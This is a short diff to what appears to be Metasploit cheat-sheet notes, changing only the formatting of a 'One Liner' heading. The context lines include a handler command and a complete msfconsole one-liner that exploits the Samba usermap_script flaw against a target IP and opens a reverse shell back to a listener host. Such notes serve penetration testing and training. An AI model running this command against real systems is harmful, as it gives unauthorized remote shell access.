@@ -282,7 +282,7 @@ exploit -j -z
 
 Once the required values are completed the following command will execute your handler – ‘msfconsole -L -r ‘
 
-*One Liner*
+One Liner:
 msfconsole -x "use exploit/multi/samba/usermap_script;\ set RHOST 172.16.194.172;\ set PAYLOAD cmd/unix/reverse;\ set LHOST 172.16.194.163;\ run"
 
 ----------------------------------------------------------------------------------------------------------------------
